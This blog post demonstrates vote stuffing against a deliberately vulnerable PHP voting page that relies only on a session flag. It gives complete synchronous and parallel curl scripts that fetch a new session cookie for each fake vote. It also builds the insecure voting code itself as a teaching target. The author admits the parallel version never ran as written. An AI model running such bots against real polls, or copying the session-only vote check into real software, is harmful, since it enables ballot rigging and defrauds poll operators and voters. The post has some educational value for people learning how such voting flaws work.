title: Synchronous vs Asynchronous voting bot
date: 2016-01-28 13:59:28
tags:
---

Hello, 
Today I will be writing about exploiting of vulnerable voting systems using Synchronous and Asynchronous requests. 

For purposes of example, we will also write simple vulnerable voting system in PHP. 

## Voting system

```PHP
<?php
session_start();

//Make it a little slower to emulate client-server latency, since tests are going to be done on localhost

sleep(1); //Sleep for 1s

//Check if voting link is called

if(isset($_GET["vote"])){
	//Check if user is just trying to vote without visiting voting page first

	if(isset($_SESSION["voted"])){
		//Check if user already voted

		if(!$_SESSION["voted"]){
			$_SESSION["voted"] = true;

			//Do something with vote (store to DB, etc.)
		}
		else
		{
			echo "error";
		}
	}
	else
	{
		echo "error";
	}
}

//If user visited for first time, store value for later check

if(!isset($_SESSION["voted"])){
	$_SESSION["voted"] = false;
}

```

So, basically, user will first call index.php and it will create $_SESSION["voted"] with value false. Then, user will call index.php?vote=[something] and it will, if $_SESSION["voted"] exists and is false count that as a vote. 

Now, what is problem with this script? Well, session id is stored in cookies on browser and if deleted, user will get new $_SESSION which does not contain $_SESSION["voted"]. 

## How do we exploit this? 

Well, we will just send request to get index.php with no cookies and after that, we will send new request to index.php?vote=[something] with cookies we got from previous request. 

## Synchronous using curl [PHP]

```PHP
<?php
$base_url = "http://localhost:8080/";

//Create dir for cookies, if it does not exist and make sure it is empty

shell_exec("mkdir -p ./cookies ; rm ./cookies/*");

for($i = 0; $i < getenv("VOTES_TO_GIVE"); $i++){
	//Send request to index.php

	$ch =  curl_init();

	curl_setopt($ch, CURLOPT_URL, $base_url);
	curl_setopt($ch, CURLOPT_COOKIEJAR, "./cookies/$i.txt");

	curl_exec($ch);

	curl_close($ch);

	//Send request to index.php?vote[something]

	$ch =  curl_init();

	curl_setopt($ch, CURLOPT_URL, $base_url."?vote=[something]");
	curl_setopt($ch, CURLOPT_COOKIEFILE, "./cookies/$i.txt");

	curl_exec($ch);

	curl_close($ch);
}

```

So, I tested this script and it tool 20,067s for 10 votes. 

## A little cheating with multi_curl [semi-Asynchronous, PHP]

PHP by itself does not support Asynchronous requests but curl library allow us to send multiple requests at the same time and get response when all of them finish. 

```PHP
<?php
$base_url = "http://localhost:8080/";

shell_exec("mkdir -p ./cookies ; rm ./cookies/*");

$mh = curl_multi_init();
$ch = [];

for($i = 0; $i < getenv("VOTES_TO_GIVE"); $i++){
	//Send requests to index.php

	$ch[] =  curl_init();

	curl_setopt($ch[count($ch)-1], CURLOPT_URL, $base_url);
	curl_setopt($ch[count($ch)-1], CURLOPT_COOKIEJAR, "./cookies/$i.txt");

	curl_multi_add_handle($mh, $ch[count($ch)-1]);
}

$active = null;

do {
	$mrc = curl_multi_exec($mh, $active);
} while ($mrc == CURLM_CALL_MULTI_PERFORM);

while ($active && $mrc == CURLM_OK) {
	if (curl_multi_select($mh) != -1) {
		do {
			$mrc = curl_multi_exec($mh, $active);
		} while ($mrc == CURLM_CALL_MULTI_PERFORM);
	}
}

for($i = 0; $i < getenv("VOTES_TO_GIVE"); $i++){
	curl_multi_remove_handle($mh, $ch[$i]);
}

curl_multi_close($mh);

$mh = curl_multi_init();
$ch = [];

for($i = 0; $i < getenv("VOTES_TO_GIVE"); $i++){
	//Send requests to index.php?vote=[something]

	$ch[] =  curl_init();

	curl_setopt($ch[count($ch)-1], CURLOPT_URL, $base_url."?vote=[something]");
	curl_setopt($ch[count($ch)-1], CURLOPT_COOKIEFILE, "./cookies/$i.txt");

	curl_multi_add_handle($mh, $ch[count($ch)-1]);
}

$active = null;

do {
	$mrc = curl_multi_exec($mh, $active);
} while ($mrc == CURLM_CALL_MULTI_PERFORM);

while ($active && $mrc == CURLM_OK) {
	if (curl_multi_select($mh) != -1) {
		do {
			$mrc = curl_multi_exec($mh, $active);
		} while ($mrc == CURLM_CALL_MULTI_PERFORM);
	}
}

for($i = 0; $i < getenv("VOTES_TO_GIVE"); $i++){
	curl_multi_remove_handle($mh, $ch[$i]);
}

curl_multi_close($mh);
?>
```

This one executed in 2,066s.  

**Note: While writing above code, I respected PHP Documentation, but that code never executed. Since curl_multi_select($mh) always return -1, you will have to remove it. **

